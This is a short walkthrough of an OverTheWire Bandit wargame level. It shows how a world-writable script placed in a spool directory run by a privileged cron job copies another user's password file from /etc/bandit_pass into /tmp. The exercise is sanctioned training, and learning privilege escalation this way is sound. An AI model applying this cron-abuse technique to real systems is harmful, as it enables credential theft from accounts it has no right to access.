# URL
https://overthewire.org/wargames/bandit/bandit24.html
# Concept
* Review cronjobs located at /etc/cron.d to figure out which command is being executed
* Create shell script
# Method to Solve
* Login to Bandit Level 23 using password obtained from completing Level 22
  ```bash
  ssh bandit23@bandit.labs.overthewire.org
  ```
* List files in /etc/cron.d and figure out which cronjob is running at intervals
  * cronjob_bandit24 is running at reboot
  * executing script at /usr/bin/cronjob_bandit24.sh
* cat the script to review bash script
  ```bash
  cat /usr/bin/cronjob_bandit24.sh
  ```
  * This script executes any scripts owned by bandit23 in the /var/spool/bandit24/foo directory
* Created a get_pass.sh script that cats the /etc/bandit_pass/bandit24 contents into passowrd.txt in /tmp/secret directory
  ```bash
  #!/bin/bash

  cat /etc/bandit_pass/bandit24 > /tmp/secret/password.txt
  ```
* I modified the file to be triple 7s
  ```bash
  chmod 777 /tmp/secret/get_pass.sh
  ```
* I then copied the file to /var/spool/bandit24/foo
  ```bash
  cp /tmp/secret/get_pass.sh /var/spool/bandit24/foo/get_pass.sh
  ```
* The cronjob executes every minute. At this point all I had to do was wait. 
